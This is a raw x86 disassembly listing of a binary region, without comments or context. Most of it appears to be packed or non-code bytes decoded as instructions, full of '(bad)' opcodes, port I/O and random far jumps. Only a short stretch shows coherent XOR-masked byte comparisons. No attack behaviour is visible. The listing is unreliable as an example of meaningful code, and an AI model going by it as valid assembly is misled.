  41458d:	retf   0xda6b
  414590:	xor    edx,esi
  414592:	mov    bh,0x7b
  414594:	js     0x414545
  414596:	xor    ch,dl
  414598:	lods   eax,DWORD PTR ds:[esi]
  414599:	sub    ecx,DWORD PTR [ebp*1-0x3db9b020]
  4145a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145a1:	stos   DWORD PTR es:[edi],eax
  4145a2:	aaa    
  4145a3:	adc    cl,BYTE PTR [ebp+0x7c]
  4145a6:	popa   
  4145a7:	ror    BYTE PTR ss:[edi-0xfcd2658],0xfb
  4145af:	fistp  QWORD PTR [esi+0x601b7fc8]
  4145b5:	int    0x1c
  4145b7:	adc    eax,0xb7aba5d5
  4145bc:	rcl    DWORD PTR [edi-0x676eacc9],cl
  4145c2:	out    0xe9,eax
  4145c4:	ss outs dx,BYTE PTR fs:[esi]
  4145c7:	mov    eax,ds:0x73b97ee6
  4145cc:	repnz retf 
  4145ce:	sbb    eax,0xe0a28237
  4145d3:	das    
  4145d4:	loop   0x4145e6
  4145d6:	jl     0x4145ee
  4145d8:	mul    ebx
  4145da:	jmp    0x4145e0
  4145dc:	callw  0xaca0
  4145e0:	scas   eax,DWORD PTR es:[edi]
  4145e1:	inc    edi
  4145e2:	das    
  4145e3:	pop    DWORD PTR [edx]
  4145e5:	es ret 
  4145e7:	dec    esi
  4145e8:	repnz fs mov edx,0x28a8991d
  4145ef:	add    eax,0x69e3b330
  4145f4:	fsubr  QWORD PTR [ebp-0x19ba984f]
  4145fa:	mov    esi,0x36d7430d
  4145ff:	mov    BYTE PTR [edx+0x3c],ah
  414602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414603:	lahf   
  414604:	adc    eax,edi
  414606:	mov    ebx,0xb22ae1d2
  41460b:	xchg   edi,eax
  41460c:	push   0x30
  41460e:	hlt    
  41460f:	mov    edx,0x671c7ff3
  414614:	and    al,ah
  414616:	push   0x18130804
  41461b:	adc    edi,DWORD PTR [ecx]
  41461d:	rol    DWORD PTR [ebx-0x19a44add],0xe6
  414624:	xor    edx,DWORD PTR [ebx-0x18bcf940]
  41462a:	retf   0xcbe
  41462d:	inc    eax
  41462e:	jmp    0x6aa731e5
  414633:	mov    dh,0xbb
  414635:	xor    ecx,DWORD PTR [ecx]
  414637:	sahf   
  414638:	sahf   
  414639:	add    ch,dh
  41463b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41463c:	pop    edi
  41463d:	(bad)  
  41463e:	icebp  
  41463f:	mov    ebp,0x751f1efd
  414644:	sti    
  414645:	cld    
  414646:	adc    al,0xdf
  414648:	mov    bh,0xd1
  41464a:	push   ds
  41464b:	iret   
  41464c:	or     al,dl
  41464e:	mov    esi,0xdba68f65
  414653:	shl    edx,1
  414655:	les    ebp,FWORD PTR [ebp+0x119d3bcd]
  41465b:	sbb    BYTE PTR [eax+0x1b9a7a3f],bh
  414661:	mov    WORD PTR [eax+0x2ba7fdc8],?
  414667:	cmp    ebx,DWORD PTR [edi-0x1e7735b8]
  41466d:	lds    edx,FWORD PTR [ebp-0x4fe2717c]
  414673:	xlat   BYTE PTR ds:[ebx]
  414674:	sbb    eax,0x16fb0804
  414679:	push   edx
  41467a:	in     al,dx
  41467b:	aaa    
  41467c:	pusha  
  41467d:	pushf  
  41467e:	gs sbb eax,0xdd1a5af6
  414684:	ja     0x414652
  414686:	push   0xffffffe8
  414688:	dec    esi
  414689:	cmp    al,bl
  41468b:	bound  edi,QWORD PTR [ebx+edi*1-0x5dd7c837]
  414692:	ror    DWORD PTR [eax],cl
  414694:	xchg   esp,eax
  414695:	fnsave [edi+0x33]
  414698:	pop    edi
  414699:	sti    
  41469a:	(bad)  
  41469b:	cmp    bl,al
  41469d:	test   eax,0x8acb4970
  4146a2:	inc    edx
  4146a3:	shl    DWORD PTR [edx-0x9],0xae
  4146a7:	xor    ch,BYTE PTR [eax]
  4146a9:	adc    al,0xbe
  4146ab:	in     eax,0x17
  4146ad:	cdq    
  4146ae:	or     BYTE PTR [esi-0x5355b9ed],al
  4146b4:	mov    ch,0xc1
  4146b6:	or     al,bh
  4146b8:	in     eax,dx
  4146b9:	in     eax,dx
  4146ba:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146bc:	cmp    ecx,0xcaf422e4
  4146c2:	pop    ss
  4146c3:	sbb    DWORD PTR [edx],eax
  4146c5:	cli    
  4146c6:	adc    al,0x21
  4146c8:	ins    BYTE PTR es:[edi],dx
  4146c9:	xor    al,0x64
  4146cb:	mov    al,ds:0x2cd05740
  4146d0:	or     bh,BYTE PTR [ebp-0x4b]
  4146d3:	ds push eax
  4146d5:	push   cs
  4146d6:	adc    al,0x6d
  4146d8:	lahf   
  4146d9:	mov    dl,0x46
  4146db:	shl    DWORD PTR [edi+0xe],1
  4146de:	or     al,BYTE PTR [edx]
  4146e0:	and    edi,DWORD PTR [edi+0x51]
  4146e3:	aam    0xd1
  4146e5:	cwde   
  4146e6:	add    bh,BYTE PTR [edi-0x6b]
  4146e9:	(bad)  
  4146ea:	cmp    BYTE PTR [ebp+0x64],dh
  4146ed:	rcl    BYTE PTR [ebp+eiz*4-0x4c],0xcd
  4146f2:	push   ecx
  4146f3:	popa   
  4146f4:	xchg   edi,eax
  4146f5:	adc    DWORD PTR [esi+ebp*8+0x1b6880a3],edi
  4146fc:	jne    0x414709
  4146fe:	cmp    ecx,ebx
  414700:	lods   al,BYTE PTR es:[esi]
  414702:	or     ebx,esp
  414704:	adc    ah,BYTE PTR [edx-0x220bd921]
  41470a:	pushf  
  41470b:	icebp  
  41470c:	jmp    0x41475c
  41470e:	fist   DWORD PTR [ebx+0x34]
  414711:	cld    
  414712:	mov    eax,0x527e19e1
  414717:	into   
  414718:	mov    esi,0x1304b9e7
  41471d:	shl    DWORD PTR [esi-0x5069a340],1
  414723:	add    al,0x3
  414725:	jge    0x4146df
  414727:	(bad)  
  414728:	or     BYTE PTR [ecx],ah
  41472a:	(bad)  
  41472b:	pop    es
  41472c:	mov    edi,0xc9d0727a
  414731:	jo     0x4147aa
  414733:	test   DWORD PTR [eax-0x1391301],esi
  414739:	and    BYTE PTR [edi],ah
  41473b:	xchg   esi,eax
  41473c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41473d:	call   0x2b71:0x2379ca15
  414744:	cs xchg edx,eax
  414746:	fmulp  st(2),st
  414748:	js     0x414761
  41474a:	(bad)  
  41474b:	jle    0x414763
  41474d:	add    bl,BYTE PTR [edi+0x2b]
  414750:	fmul   QWORD PTR [edi+0x7f]
  414753:	out    dx,eax
  414754:	adc    eax,0xbf872453
  414759:	mulps  xmm1,XMMWORD PTR [esi-0x19]
  41475d:	cmp    al,BYTE PTR [ecx-0x37f49d3a]
  414763:	sub    edx,DWORD PTR [ecx+0x3a85541b]
  414769:	cmp    eax,0xffffffb5
  41476c:	cmp    BYTE PTR [ebp+0x55],bl
  41476f:	dec    ecx
  414770:	or     eax,0x25c416d1
  414775:	pop    ebx
  414776:	fsubr  QWORD PTR [esi]
  414778:	push   ecx
  414779:	cmp    al,0xaa
  41477b:	jbe    0x4147f5
  41477d:	jmp    0x86496885
  414782:	(bad)  
  414783:	or     al,0x60
  414785:	xchg   ecx,eax
  414786:	retf   
  414787:	dec    esi
  414788:	jmp    0xd5d4:0x5f0693ea
  41478f:	xor    BYTE PTR [edx+0x73649eaa],0x4e
  414796:	outs   dx,BYTE PTR ds:[esi]
  414797:	ficom  DWORD PTR [ecx]
  414799:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41479b:	jl     0x414797
  41479d:	xchg   ebp,eax
  41479e:	(bad)  ds:0xd43dbb82
  4147a4:	cmp    BYTE PTR [eax-0x3c],ah
  4147a7:	push   esp
  4147a8:	xor    eax,0x7718a136
  4147ad:	push   ebp
  4147ae:	mov    ebp,DWORD PTR [edx-0x4b]
  4147b1:	and    DWORD PTR [esi+0x30],0xffffffe4
  4147b5:	sbb    al,0xb5
  4147b7:	inc    ebx
  4147b8:	pop    edi
  4147b9:	xor    al,bh
  4147bb:	aad    0xd2
  4147bd:	jmp    0x414747
  4147bf:	rcl    DWORD PTR [edx],1
  4147c1:	mov    esi,0x3b1467ae
  4147c6:	inc    esp
  4147c7:	fdivr  DWORD PTR [edx+ecx*2+0x636cf671]
  4147ce:	cmc    
  4147cf:	dec    esi
  4147d0:	jb     0x4147ad
  4147d2:	pop    ds
  4147d3:	dec    edi
  4147d4:	out    0xec,eax
  4147d6:	push   esi
  4147d7:	test   BYTE PTR [ebx+0x2e9d7ad9],cl
  4147dd:	push   cs
  4147de:	out    dx,al
  4147df:	lods   eax,DWORD PTR ds:[esi]
  4147e0:	cld    
  4147e1:	fild   DWORD PTR [esi-0x17bd877d]
  4147e7:	in     al,0x37
  4147e9:	or     al,0x4
  4147eb:	lock retf 0xfb9e
  4147ef:	ret    
  4147f0:	push   esi
  4147f1:	std    
  4147f2:	add    eax,0x30afdcbc
  4147f7:	std    
  4147f8:	int3   
  4147f9:	mov    BYTE PTR [esi-0x436832fb],ch
  4147ff:	iret   
  414800:	push   ebx
  414801:	mov    esp,0x7782181f
  414806:	imul   esi,DWORD PTR [ebx],0xffffffe8
  414809:	repz adc eax,0xaabced15
  41480f:	xor    al,0xf1
  414811:	dec    ch
  414813:	mov    eax,0x27d29f15
  414818:	in     eax,dx
  414819:	in     al,0xa0
  41481b:	inc    esi
  41481c:	mov    DWORD PTR [edx-0x62a2f5ce],edx
  414822:	in     eax,dx
  414823:	scas   eax,DWORD PTR es:[edi]
  414824:	mov    ecx,0xa0b7a9e5
  414829:	into   
  41482a:	aad    0x60
  41482c:	cmp    ecx,DWORD PTR [esi+ebp*4-0x8]
  414830:	hlt    
  414831:	stc    
  414832:	out    dx,al
  414833:	jge    0x414831
  414835:	jne    0x4147c2
  414837:	xchg   edx,eax
  414838:	jne    0x414850
  41483a:	shr    DWORD PTR [ebx-0x5c834605],1
  414840:	aam    0x92
  414842:	ret    
  414843:	xchg   esp,esi
  414845:	push   edi
  414846:	stos   DWORD PTR es:[edi],eax
  414847:	fmul   QWORD PTR [ebx-0x6740495b]
  41484d:	lods   eax,DWORD PTR ds:[esi]
  41484e:	mov    cl,0x86
  414850:	add    esp,DWORD PTR [edi+eiz*8-0x7]
  414854:	xor    ch,BYTE PTR [eax]
  414856:	push   ecx
  414857:	dec    ebx
  414858:	and    DWORD PTR [ecx-0x68b644b],edx
  41485e:	test   BYTE PTR [esi+0x29e82186],0x74
  414865:	std    
  414866:	xchg   edx,eax
  414867:	sub    al,cl
  414869:	jo     0x4148c9
  41486b:	hlt    
  41486c:	mov    ebp,0x588aa348
  414871:	lods   eax,DWORD PTR ds:[esi]
  414872:	inc    eax
  414873:	mov    WORD PTR [ebx-0x4594c089],gs
  414879:	addr16 or ah,ch
  41487c:	jge    0x4148fc
  41487e:	add    al,BYTE PTR [ebp-0x3f18da9c]
  414884:	rcr    BYTE PTR [ebx-0x276fd975],1
  41488a:	xchg   ebp,eax
  41488b:	arpl   WORD PTR [eax+eiz*4],dx
  41488e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41488f:	cmp    eax,0x5eaa1e0
  414894:	mov    esp,0x7b2ee1bd
  414899:	out    0x9e,eax
  41489b:	lods   al,BYTE PTR ds:[esi]
  41489c:	stos   BYTE PTR es:[edi],al
  41489d:	push   0xffffffe9
  41489f:	shl    BYTE PTR [edx+0x69],1
  4148a2:	mov    esi,0xa0f0899b
  4148a7:	ins    DWORD PTR es:[edi],dx
  4148a8:	sbb    al,0x24
  4148aa:	pop    ecx
  4148ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ac:	xor    edi,eax
  4148ae:	sbb    ebx,DWORD PTR [eax+0x145043db]
  4148b4:	add    cl,BYTE PTR [ebx-0x2fccf7ab]
  4148ba:	add    edx,esi
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0x8d21fccf
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx+0xc90dffa],0xffffffb9
  414952:	(bad)  
  414953:	ins    BYTE PTR es:[edi],dx
  414954:	push   esi
  414955:	dec    edx
  414956:	mov    ecx,0xbf5eb39b
  41495b:	mov    ch,0xd2
  41495d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41495e:	(bad)  
  41495f:	(bad)  
  414960:	jne    0x414911
  414962:	adc    DWORD PTR [edi-0x19c8c782],esi
  414968:	jo     0x4148f5
  41496a:	aas    
  41496b:	out    dx,eax
  41496c:	push   ds
  41496d:	sub    al,0x79
  41496f:	ds fdivrp st(7),st
  414972:	mov    ah,0x2a
  414974:	out    dx,eax
  414975:	cli    
  414976:	(bad)  [esi+ebx*2+0x59acf201]
  41497d:	loop   0x414969
  41497f:	aaa    
  414980:	(bad)  
  414981:	aas    
  414982:	sbb    BYTE PTR [esi-0x2a3adee7],ah
  414988:	add    DWORD PTR [eax+0x3ee00063],esi
  41498e:	lods   al,BYTE PTR ds:[esi]
  41498f:	lods   al,BYTE PTR ds:[esi]
  414990:	(bad)  
  414991:	out    0x1c,eax
  414993:	pop    ebp
  414994:	jle    0x414944
  414996:	xchg   ebp,eax
  414997:	stc    
  414998:	aaa    
  414999:	mov    al,0xc2
  41499b:	fnsave [esi+0x5be9a297]
  4149a1:	aaa    
  4149a2:	retf   
  4149a3:	jp     0x41499a
  4149a5:	sbb    BYTE PTR [ecx+0x25],al
  4149a8:	mov    al,0xdf
  4149aa:	cwde   
  4149ab:	pop    edi
  4149ac:	imul   di,WORD PTR [ebx-0x269306ec],0xd97a
  4149b5:	xchg   ecx,eax
  4149b6:	pop    ds
  4149b7:	xchg   edx,eax
  4149b8:	dec    esp
  4149b9:	mov    ds:0xfface15b,al
  4149be:	sbb    eax,0xeae43d9d
  4149c3:	push   0xffffff9f
  4149c5:	push   ebx
  4149c6:	repnz into 
  4149c8:	sbb    DWORD PTR [ecx-0x438092a9],esi
  4149ce:	clc    
  4149cf:	out    dx,al
  4149d0:	xchg   edi,eax
  4149d1:	sti    
  4149d2:	adc    eax,0x7f701902
  4149d7:	inc    esi
  4149d8:	pop    ebx
  4149d9:	add    BYTE PTR [ebx+0x4292ba0c],dh
  4149df:	cmp    DWORD PTR [ebx],edx
  4149e1:	aas    
  4149e2:	jmp    0xaebc:0x7e2c5193
  4149e9:	xchg   edi,eax
  4149ea:	jae    0x4149cc
  4149ec:	add    dl,dl
  4149ee:	js     0x414a24
  4149f0:	jmp    0x9fef:0x8a5ba338
  4149f7:	and    dl,BYTE PTR [ecx-0x5e102cab]
  4149fd:	in     eax,dx
  4149fe:	jl     0x4149cb
  414a00:	fstp   DWORD PTR [eax-0x4b56e18b]
  414a06:	pop    ebp
  414a07:	adc    esp,ebp
  414a09:	test   dh,dh
  414a0b:	and    DWORD PTR [edx-0x46a3b0a4],ecx
  414a11:	das    
  414a12:	ret    
  414a13:	imul   esi,DWORD PTR [ecx+0x1a],0xcbbbfc69
  414a1a:	xchg   DWORD PTR [ecx+0x7da60e5a],edi
  414a20:	sub    eax,ebp
  414a22:	shr    BYTE PTR [eax+0x63],cl
  414a25:	pop    ds
  414a26:	sub    al,0x6
  414a28:	addr16 popf 
  414a2a:	lock (bad) [edi-0x10ee7e8a]
  414a31:	push   ebp
  414a32:	cmp    dl,al
  414a34:	gs retf 
  414a36:	mov    bl,0xef
  414a38:	loope  0x4149c2
  414a3a:	inc    DWORD PTR [edi-0x527b831]
  414a40:	in     al,dx
  414a41:	lock in al,0xc0
  414a44:	add    ah,ah
  414a46:	xor    BYTE PTR [eax],cl
  414a48:	loopne 0x414a2a
  414a4a:	xor    bl,BYTE PTR [ebp+0x4ac29414]
  414a50:	add    edx,DWORD PTR [edi-0x3c8509f3]
  414a56:	inc    eax
  414a57:	jo     0x4149ff
  414a59:	push   0x391d5a10
  414a5e:	pusha  
  414a5f:	jmp    0xa21a:0x1f4a6fb2
  414a66:	jbe    0x414a3e
  414a68:	inc    eax
  414a69:	(bad)  [ebx]
  414a6b:	adc    bh,BYTE PTR cs:[ebx-0x5b]
  414a6f:	pop    ecx
  414a70:	dec    BYTE PTR [edx-0xd]
  414a73:	jmp    0x2dde:0xfcac82b0
  414a7a:	mov    ebx,0x1cbc7f7c
  414a7f:	adc    BYTE PTR ds:0xb7e053e0,ah
  414a85:	stc    
  414a86:	and    BYTE PTR [edx*8+0x10b56bf6],dl
  414a8d:	jmp    0x414abc
  414a8f:	pop    ds
  414a90:	dec    edx
  414a91:	(bad)  
  414a92:	aad    0x12
  414a94:	aam    0x7f
  414a96:	test   eax,0x3cbafbe9
  414a9b:	mov    bl,0x13
  414a9d:	mov    ebx,0x239b522a
  414aa2:	in     eax,dx
  414aa3:	xchg   ebp,eax
  414aa4:	or     cl,BYTE PTR [ecx-0x5]
  414aa7:	xchg   edx,eax
  414aa8:	(bad)  [edi-0x3c388fad]
  414aae:	sbb    al,0xca
  414ab0:	dec    edi
  414ab1:	cmp    al,0x4d
  414ab3:	mov    dh,0x7a
  414ab5:	jb     0x414b2d
  414ab7:	pop    es
  414ab8:	in     eax,dx
  414ab9:	loop   0x414b20
  414abb:	out    dx,eax
  414abc:	test   eax,0xcfb2dcdb
  414ac1:	test   BYTE PTR [eax-0x12a5da6c],ah
  414ac7:	push   ebp
  414ac8:	push   ecx
  414ac9:	inc    ecx
  414aca:	test   eax,0xef9fe7
  414acf:	push   0xffffffe6
  414ad1:	sti    
  414ad2:	push   0x8384454e
  414ad7:	mov    al,0xb0
  414ad9:	ret    
  414ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414adb:	cld    
  414adc:	sub    al,BYTE PTR [esi-0x5d4dfe56]
  414ae2:	or     esp,DWORD PTR [ebp+edx*8+0x420a188d]
  414ae9:	xor    ebx,ecx
  414aeb:	not    BYTE PTR [edx-0x1a]
  414aee:	fmulp  st(6),st
  414af0:	and    al,0x95
  414af2:	add    esp,DWORD PTR [eax-0x16]
  414af5:	popa   
  414af6:	mul    BYTE PTR gs:[edi-0x505bb4fe]
  414afd:	push   esi
  414afe:	or     DWORD PTR [edi+0x5ca43056],eax
  414b04:	inc    edi
  414b05:	shl    BYTE PTR [edx+0x3ebf2bb5],1
  414b0b:	(bad)  
  414b0c:	mov    bh,0x5b
  414b0e:	pop    ds
  414b0f:	scas   al,BYTE PTR es:[edi]
  414b10:	outs   dx,DWORD PTR ds:[esi]
  414b11:	fwait
  414b12:	sub    ebp,DWORD PTR [ebx]
  414b14:	jne    0x414ac7
  414b16:	das    
  414b17:	lods   al,BYTE PTR ds:[esi]
  414b18:	xlat   BYTE PTR ds:[ebx]
  414b19:	pop    es
  414b1a:	add    DWORD PTR [eax+0x34335c3e],eax
  414b20:	cli    
  414b21:	push   es
  414b22:	aam    0x31
  414b24:	sub    DWORD PTR ds:0xd9ad34d4,edi
  414b2a:	push   edx
  414b2b:	dec    edi
  414b2c:	in     eax,0xac
  414b2e:	add    ch,BYTE PTR [ebx]
  414b30:	mov    dh,0xe0
  414b32:	arpl   WORD PTR [edx],sp
  414b34:	pusha  
  414b35:	jbe    0x414b99
  414b37:	test   DWORD PTR [edx+0x9],ebx
  414b3a:	mov    eax,0x2dc1efd
  414b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b40:	outs   dx,BYTE PTR cs:[esi]
  414b42:	das    
  414b43:	in     eax,0xa2
  414b45:	add    ebp,DWORD PTR [edi+esi*4]
  414b48:	(bad)  
  414b49:	mov    bl,0xfa
  414b4b:	out    dx,al
  414b4c:	cmp    al,0x60
  414b4e:	repz pop ds
  414b50:	jle    0x414b71
  414b52:	xchg   cl,bl
  414b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b55:	loopne 0x414b20
  414b57:	push   ss
  414b58:	sub    eax,0x78fabc71
  414b5d:	sbb    cl,BYTE PTR [esi]
  414b5f:	outs   dx,BYTE PTR ds:[esi]
  414b60:	rcl    DWORD PTR [ebp-0x30],0x72
  414b64:	adc    ebx,ebp
  414b66:	(bad)  
  414b67:	mov    DWORD PTR [edx-0x5ee180cd],ecx
  414b6d:	por    mm3,QWORD PTR [edi-0x6f927d09]
  414b74:	pop    ebx
  414b75:	push   edi
  414b76:	sbb    DWORD PTR [ebx+0x74],edi
  414b79:	lods   al,BYTE PTR ds:[esi]
  414b7a:	iret   
  414b7b:	mov    dh,BYTE PTR [ecx+0x5f]
  414b7e:	icebp  
  414b7f:	mov    eax,0xb4691769
  414b84:	add    al,0x28
  414b86:	scas   al,BYTE PTR es:[edi]
  414b87:	popa   
  414b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b89:	xabort 0x88
  414b8c:	mov    esp,DWORD PTR [edx-0x16]
  414b8f:	and    ebx,ecx
  414b91:	xchg   ebx,eax
  414b92:	(bad)  
  414b93:	pop    ss
  414b94:	mov    edx,0xb1e5543f
  414b99:	xchg   ebp,eax
  414b9a:	cmp    ecx,DWORD PTR [ebp+ebp*8-0x22]
  414b9e:	pop    esp
  414b9f:	pop    ebp
  414ba0:	push   ds
  414ba1:	dec    ebx
  414ba2:	mov    ds:0x5011e879,eax
  414ba7:	xor    al,bl
  414ba9:	pop    ss
  414baa:	fidiv  DWORD PTR [edx]
  414bac:	aad    0x3e
  414bae:	mov    WORD PTR [edi+ecx*2],?
  414bb1:	sahf   
  414bb2:	adc    al,0x44
  414bb4:	retf   
  414bb5:	mov    ch,BYTE PTR [esi-0x2a5ff046]
  414bbb:	inc    eax
  414bbc:	cmp    BYTE PTR [edx-0x42],cl
  414bbf:	(bad)  
  414bc0:	scas   al,BYTE PTR es:[edi]
  414bc1:	cli    
  414bc2:	inc    edx
  414bc3:	sbb    DWORD PTR [edx-0x5b],esi
  414bc6:	shr    BYTE PTR [eax+0x4c],0xc9
  414bca:	add    esi,esi
  414bcc:	mov    edx,0x143e5c8
  414bd1:	inc    ecx
  414bd2:	cmp    ah,BYTE PTR [ecx+0x109fbfc1]
  414bd8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  414bda:	adc    ecx,DWORD PTR [ecx-0x6fd8f991]
  414be0:	and    DWORD PTR [edx+0x3],0xffffff81
  414be4:	outs   dx,BYTE PTR ds:[esi]
  414be5:	mov    cs,WORD PTR [eax+0x67]
  414be8:	adc    ebp,edi
  414bea:	add    ch,al
  414bec:	mov    edi,DWORD PTR [edi-0x2fe67f96]
  414bf2:	ins    BYTE PTR es:[edi],dx
  414bf3:	adc    eax,0x63f05538
  414bf8:	adc    eax,0xe1e8cfde
  414bfd:	xchg   DWORD PTR [edx-0x4f],edi
  414c00:	cmc    
  414c01:	inc    eax
  414c02:	sbb    DWORD PTR [esi+0xb],edx
  414c05:	pop    edx
  414c06:	mov    ebp,0xb9f947f6
  414c0b:	ds pop edx
  414c0d:	test   al,0xa
  414c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c10:	or     BYTE PTR [edx],ah
  414c12:	or     DWORD PTR [edi],eax
  414c14:	pop    es
  414c15:	lea    edx,[esp+eiz*2]
  414c18:	lods   al,BYTE PTR ds:[esi]
  414c19:	fld    QWORD PTR [ebp-0x558d76f9]
  414c1f:	adc    ebp,DWORD PTR [edx+0x58]
  414c22:	dec    edi
  414c23:	jne    0x414bfe
  414c25:	and    ebx,esp
  414c27:	cdq    
  414c28:	std    
  414c29:	stos   BYTE PTR es:[edi],al
  414c2a:	dec    ebx
  414c2b:	sub    esp,ebp
  414c2d:	sub    bh,BYTE PTR [ebp+0x28]
  414c30:	repnz (bad) 
  414c32:	pusha  
  414c33:	(bad)  
  414c35:	mov    esi,0x6e287b60
  414c3a:	dec    eax
  414c3b:	cmp    cl,BYTE PTR [ebx]
  414c3d:	rol    DWORD PTR [eax],cl
  414c3f:	pop    bp
  414c41:	jnp    0x414c0e
  414c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c44:	int3   
  414c45:	fwait
  414c46:	inc    edi
  414c47:	sbb    DWORD PTR [esi-0x3e048994],0x2732501
  414c51:	add    al,0xb5
  414c53:	or     al,bl
  414c55:	sahf   
  414c56:	cli    
  414c57:	fwait
  414c58:	sbb    esi,DWORD PTR [esi+eax*4+0x6dc36ab8]
  414c5f:	cs inc esi
  414c61:	add    eax,0xadf8f79f
  414c66:	aad    0x57
  414c68:	ror    BYTE PTR ds:0x207355e6,1
  414c6e:	or     eax,0x2be537d5
  414c73:	dec    edi
  414c74:	idiv   ch
  414c76:	xchg   BYTE PTR [esi+eiz*1],ah
  414c79:	(bad)  
  414c7a:	push   eax
  414c7b:	pcmpeqw mm4,QWORD PTR [ecx]
  414c7e:	lods   al,BYTE PTR ds:[esi]
  414c7f:	push   es
  414c80:	fdiv   QWORD PTR [eax+0x68e04393]
  414c86:	push   cs
  414c87:	jp     0x414ca1
  414c89:	sar    BYTE PTR [ebp+0x69a6ec34],1
  414c8f:	pop    esi
  414c90:	int3   
  414c91:	dec    edi
  414c92:	icebp  
  414c93:	push   eax
  414c94:	ficom  DWORD PTR [eax+0x61]
  414c97:	sub    dh,cl
  414c99:	push   ss
  414c9a:	lahf   
  414c9b:	das    
  414c9c:	mov    al,ds:0xe720f407
  414ca1:	dec    esp
  414ca2:	or     al,0x54
  414ca4:	stos   DWORD PTR es:[edi],eax
  414ca5:	lahf   
  414ca6:	inc    ebx
  414ca7:	xchg   ecx,eax
  414ca8:	or     BYTE PTR [ecx+0x4e],dh
  414cab:	push   es
  414cac:	fistp  DWORD PTR [ebx]
  414cae:	adc    DWORD PTR [esi+0x3e5b0ed9],esi
  414cb4:	push   ss
  414cb5:	xor    al,0x7e
  414cb7:	outs   dx,DWORD PTR ds:[esi]
  414cb8:	aaa    
  414cb9:	inc    ebx
  414cba:	mov    cs,WORD PTR [esi+0x6342c3e5]
  414cc0:	pop    esp
  414cc1:	test   al,0xbe
  414cc3:	and    DWORD PTR [edi+0x5b0c8d9],ebp
  414cc9:	inc    edi
  414cca:	inc    eax
  414ccb:	inc    eax
  414ccc:	clc    
  414ccd:	sub    eax,0x8c17c8b9
  414cd2:	xchg   edi,eax
  414cd3:	mov    ah,0x46
  414cd5:	and    edx,DWORD PTR [edi+0x2203a814]
  414cdb:	sub    eax,0x8817e8e0
  414ce0:	mov    ebp,0xd8c76d5f
  414ce5:	mov    BYTE PTR ds:0x67fc33a8,ch
  414ceb:	pushf  
  414cec:	adc    edx,DWORD PTR [edi]
  414cee:	lods   eax,DWORD PTR ds:[esi]
  414cef:	cmp    eax,0x2a1c2fc0
  414cf4:	mov    eax,0x6f2b9766
  414cf9:	push   ebp
  414cfa:	nop
  414cfb:	or     BYTE PTR [ebx],bl
  414cfd:	je     0x414d5b
  414cff:	(bad)  
  414d00:	xchg   BYTE PTR [eax+0x705edc8f],dh
  414d06:	jb     0x414d55
  414d08:	push   cs
  414d09:	adc    BYTE PTR [ebx-0x15042b16],bh
  414d0f:	mov    ebp,0xfbaa169f
  414d14:	jns    0x414d42
  414d16:	and    ecx,DWORD PTR [esi+0x38cd5af]
  414d1c:	jge    0x414cc7
  414d1e:	pop    ss
  414d1f:	(bad)  
  414d21:	icebp  
  414d22:	jmp    0xf61a:0x8fd51dec
  414d29:	xchg   DWORD PTR [edi+0x1a088adc],eax
  414d2f:	ror    al,cl
  414d31:	(bad)  [eax+0x13148356]
  414d37:	mov    ebx,0x1b49905d
  414d3c:	std    
  414d3d:	fisttp WORD PTR [ebx]
  414d3f:	dec    ebx
  414d40:	sbb    DWORD PTR [esi],esi
  414d42:	arpl   WORD PTR [esi-0x1e],sp
  414d45:	xchg   edx,eax
  414d46:	push   0xffffffaa
  414d48:	hlt    
  414d49:	not    DWORD PTR [ecx+0x47]
  414d4c:	dec    ebx
  414d4d:	sbb    BYTE PTR [ebx-0x4eb1550],al
  414d53:	and    esp,esp
  414d55:	adc    ch,dh
  414d57:	mov    eax,ds:0x4834976a
  414d5c:	pop    ebp
  414d5d:	mov    ebx,0x43b4c2f
  414d62:	or     eax,0x1bdc9699
  414d67:	dec    edx
  414d68:	cmp    ecx,DWORD PTR cs:[edi+ebx*1]
